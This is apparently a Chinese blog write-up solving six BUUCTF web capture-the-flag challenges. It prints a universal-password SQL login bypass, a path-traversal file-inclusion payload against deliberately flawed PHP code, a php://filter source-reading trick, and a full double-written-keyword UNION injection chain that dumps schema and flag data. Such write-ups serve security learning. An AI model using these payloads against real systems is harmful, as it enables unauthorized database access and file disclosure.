---
title: BUUCTF-web刷题
tags: 
  - web
  - CTF
category: WriteUP
permalink: /archives/44511/
published: 2022-08-09 20:02:51
---

> BUUCTF平台的web题，持续刷。

## [极客大挑战 2019]EasySQL

- 题目：

![img](./images/1659965485785-6b64d659-c5b2-4c84-a2d6-8adca00fb79f.png)

- 有登录框，第一联想到利用sql注入，直接尝试万能密码`' or '1'='1`登录

![img](./images/1659965617560-a5ba0dd4-aa1f-42b2-858c-0228a48d5ff0.png)

## [HCTF 2018]WarmUp

- 一进去就只有一个滑稽脸，直接查看源码，得到source.php，进去得到源码

![img](./images/1659966780771-950e19e1-5821-4413-a295-95f5b8e4e69c.png)

- 源码：

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

> 1、代码审计，发现还有一个hint.php，进去后得到`flag not here, and flag in ffffllllaaaagggg`，那也就是flag在ffffllllaaaagggg里，但是没有具体说明是在那个目录下，因此构造时候需要依次通过…/…/构造尝试，去查看到底是几层的根目录
>
> 2、代码审计，发现是白名单验证，文件包含只能包含source.php和hint.php
>
> 3、根据后面的if条件得知，file不能为空，必须为字符串，还要通过checkfile()函数的检查，才能包含。
>
> 4、其中检查共有三次，第三次要经过url解码
>
> 5、payload：`file=source.php%253f/../../../../../../ffffllllaaaagggg`

![img](./images/1659967349372-dd08f2da-cd70-4bf1-837d-72ae29d9a6b4.png)

## [极客大挑战 2019]Havefun

- 查看源码

![img](./images/1659967412083-2a52fb54-ea7b-4b91-afcf-d13ac14f417b.png)

- 根据源码很容易得到payload：`?cat=dog`

![img](./images/1659967477695-b75a0926-7bd4-4aec-9fd6-dc9ceec4afa0.png)

## [ACTF2020 新生赛]Include

- 一上来直接给了一个tips超链接，然后进去得到

![img](./images/1659967617876-e53455d1-be03-490a-9535-2b080959168d.png)

> 观察url发现有flag.php，结合题目判断这题是php伪协议
>
> payload：`?file=php://filter/read=convert.base64-encode/resource=flag.php`
>
> 把得到的base64字符串进行解码

![img](./images/1659967946632-5f593b96-3985-40fc-b130-d6970949269d.png)

## [ACTF2020 新生赛]Exec

- 发现是一个ping的命令执行，测试一下其他命令是否也能执行，是成功的

![img](./images/1659968049937-11d102a4-aad2-4521-addc-2565f4365f77.png)

- 那就直接抓取flag

![img](./images/1659968097734-9507a5b1-d1c7-4c96-9799-28142ac652c8.png)

## [极客大挑战 2019]BabySQL

- 题目：

![img](./images/1660980135444-9e2c836c-0b7b-416a-bec3-448669307193.png)

- 尝试用admin登录失败

![img](./images/1660980292881-fe4cd226-1a20-4168-b380-81049dd174a2.png)

- 进行sql注入

- payload：`?username=1' order by 3&password=admin`

![img](./images/1660980630189-828aecb0-e231-480b-9afe-ae74878e637a.png)

- 可以看到order的or和by均被过滤掉了

- 尝试联合注入

![img](./images/1660980811662-e338fa89-2fa7-4dcf-aba6-7a04c76af288.png)

> 同样union和select也都被过滤掉了
>
> 利用双写绕过，发现有3个字段

- payload：`?username=' oorrder bbyy 4--+&password=admin`

![img](./images/1660981906860-fa3011f9-ef66-4488-9a17-60d972a3fd6f.png)

- 回显位为第二个和第三个字段

- payload：`?username=' ununionion seselectlect 1,2,3--+&password=admin`

![img](./images/1660982012073-e323a752-31ff-482b-8c78-bb5d7f3cd5d9.png)

- 查所有库

- payload：`?username=' ununionion seselectlect 1,2,(seselectlect group_concat(schema_name) frfromom infoorrmation_schema.schemata)--+&password=admin`

![img](./images/1660983995572-138d1d45-29d6-4c8e-8214-3849ec5c205d.png)

- 查ctf库中的所有表
- payload：`?username=' ununionion seselectlect 1,2,(seselectlect group_concat(table_name) frfromom infoorrmation_schema.tables whewherere table_schema='ctf') --+&password=admin`

![img](./images/1660984181446-440ed3b8-df44-4bd8-bdf6-23ce262e07ee.png)

- 查Flag表中的所有字段
- payload：`?username=' ununionion seselectlect 1,2,(seselectlect group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name='Flag') --+&password=admin`

![img](./images/1660984384749-570e6518-f223-45f2-9cc9-5ee6d769ad2c.png)

- 查看flag字段内的内容
- paylaod：`?username=' ununionion seselectlect 1,2,group_concat(flag) frfromom ctf.Flag--+&password=admin`

![img](./images/1660983468939-228328bb-4756-402f-884b-4a9cfd20a403.png)
